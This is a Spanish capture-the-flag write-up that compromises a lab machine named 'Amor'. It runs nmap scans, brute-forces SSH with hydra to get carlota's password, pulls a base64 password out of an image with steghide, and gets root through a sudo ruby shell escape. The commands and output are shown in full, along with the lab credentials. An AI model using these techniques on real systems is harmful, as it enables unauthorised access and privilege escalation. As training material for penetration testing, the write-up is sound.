# Amor

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Como tenemos abierto los puertos 22 y 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p22,80 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p22,80`: Escaneo de los puertos 22 (SSH) y 80 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFOlcvTYtJesi6ym4P8zs6NrI1vxFDJUA1MZuHNnJnTpn2cfHyL5Sc7ZuA8TnpH9OLkUnRrZLfGP6SVEDcxX6F8=
|   256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINj1tBchFeGScA7WX6BgUscF+TmiVpcs2YiGxuOotPel
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: SecurSEC S.L
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.58 (Ubuntu)
```
Como no tenemos usuarios de ssh ni la versión de OpenSSH nos permite la enumeración de usuarios, vamos a ver que es lo que podemos de enumerar en el puerto 80.
Vemos una nota importante que podemos, de la que podemos obtener dos posibles usuarios ssh.
```
¡Importante! Despido de empleado
Juan fue despedido de la empresa por enviar un correo con la contraseña a un compañero.
Firmado: Carlota, Departamento de ciberseguridad
'''
Con hydra probamos si a través de fuerza bruta podemos obtener acceso con ellos y vemos que con carlota podemos obtener una contraseña.
```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
## Explotación.
```
❯ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-20 10:42:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
1 of 1 target successfully completed, 1 valid password found
```
Nos conectamos por ssh.
```bash
ssh carlota@172.17.0.2
```
```
❯ ssh carlota@172.17.0.2
carlota@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon May 20 07:58:35 2024 from 172.17.0.1
$ whoami
carlota
```
Hacemos un pequeño tratamiento de la tty.
```bash
script /dev/null -c bash
```
En el escritorio encontramos una carpeta con una imagen.
```
4carlota@d7b55dad8c9e:~/Desktop/fotos/vacaciones$ ll
total 60
drwxr-xr-x 1 root root  4096 Apr 26 11:02 ./
drwxr-xr-x 1 root root  4096 Apr 26 11:02 ../
-rw-r--r-- 1 root root 51914 Apr 26 11:02 imagen.jpg
```
Nos descargamos la imagen a nuestro equipo para ver si tiene algo oculto.
Con python creamos en la ubicación de la imagen un servidor http y la descargamos con wget desde nuestro ordenaodr.
Servidor Python.
```bash
python3 -m http.server 8080
```
Descargar a nuestro equipo.
```bash
wget http://172.17.0.2:8080/imagen.jpg
```
Una vez en nuestro equipo comprobamos con **steghide** si tiene información oculta y vemos que si que tiene un archivo oculto.
```bash
steghide extract -sf imagen.jpg
```
```
❯ steghide extract -sf imagen.jpg
Enter passphrase: 
wrote extracted data to "secret.txt".
```
De passphrase le damos a INTRO sin poner nada. Leemos el contenido de **secret.txt** y vemos otra contraseña.
```
❯ cat secret.txt
ZXNsYWNhc2FkZXBpbnlwb24=
```
Vemos que es una contraseña cifrada en base64.
```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
```
```
❯ echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
eslacasadepinypon
```
Si vemos cuantos usuario hay en el sistema hay uno que es **Oscar** que vamos a utilizar la contraseña obtenida para escalar privilegios.
## Escalada de privilegios.
```
carlota@d7b55dad8c9e:/home$ ll
total 24                                                                                                                                                                                                                                    
drwxr-xr-x 1 root    root    4096 Apr 26 11:01 ./                                                                                                                                                                                           
drwxr-xr-x 1 root    root    4096 May 20 07:53 ../                                                                                                                                                                                          
drwxr-x--- 1 carlota carlota 4096 May 20 07:57 carlota/                                                                                                                                                                                     
drwxr-x--- 1 oscar   oscar   4096 Apr 26 11:02 oscar/                                                                                                                                                                                       
drwxr-x--- 2 ubuntu  ubuntu  4096 Apr 23 15:31 ubuntu/
```
```bash
su oscar
```
Y hacemos un pequeño tratamiento de la tty.
```
carlota@d7b55dad8c9e:/home$ su oscar
Password:                                                                                                                                                                                                                                   
$ whoami                                                                                                                                                                                                                                    
oscar                                                                                                                                                                                                                                       
$ script /dev/null -c bash                                                                                                                                                                                                                  
Script started, output log file is '/dev/null'.                                                                                                                                                                                             
oscar@d7b55dad8c9e:/home$
```
Y para escalar privilegios a root, comprobamos si oscar puede ejecutar algún binario con privilegios de root y encontramos que si.
```bash
sudo -l
```
```
oscar@d7b55dad8c9e:/home$ sudo -l
Matching Defaults entries for oscar on d7b55dad8c9e:                                                                                                                                                                                        
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                                                                              
                                                                                                                                                                                                                                            
User oscar may run the following commands on d7b55dad8c9e:                                                                                                                                                                                  
    (ALL) NOPASSWD: /usr/bin/ruby 
```
Con ruby podemos lanzarnos una bash y así obtener privilegios de root. Para ver como hacerlo vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/).
```bash
sudo ruby -e 'exec "/bin/sh"'
```
```
oscar@d7b55dad8c9e:/home$ sudo ruby -e 'exec "/bin/sh"'
# whoami                                                                                                                                                                                                                                    
root                                                                                                                                                                                                                                        
#
```
